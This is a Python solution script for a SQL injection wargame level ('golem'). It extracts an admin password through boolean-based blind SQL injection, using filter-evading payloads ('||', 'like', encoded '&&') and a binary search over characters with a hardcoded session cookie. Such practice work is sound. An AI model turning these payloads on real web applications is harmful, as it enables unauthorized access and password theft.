import requests

host = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookies = { 'PHPSESSID' : 'hufegu8d5vf6fr7221587bq7vl' }

pw_length = 0

while True:
    pw_length += 1

    query = f"' || id like 'admin' %26%26 length(pw) like {pw_length}-- -"
    url = f"{host}?pw={query}"

    r = requests.get(url, cookies = cookies)

    if "Hello admin" in r.text:
        print(f"password length: {pw_length}")
        break

password = ""

for i in range(1, pw_length+1):
    high = 127
    low = 32
    char = ''

    while low <= high:
        mid = (low+high)//2
        query = f"' || id like 'admin' %26%26 ascii(mid(pw, {i}, 1)) > {mid}-- -"
        url = f"{host}?pw={query}"

        r = requests.get(url, cookies = cookies)

        if "Hello admin" in r.text:
            low = mid + 1
        else:
            high = mid  - 1
            char = chr(mid)
    
    password += char
    print(f"현재까지 찾은 비밀번호: {password}")

print(f"final password: {password}")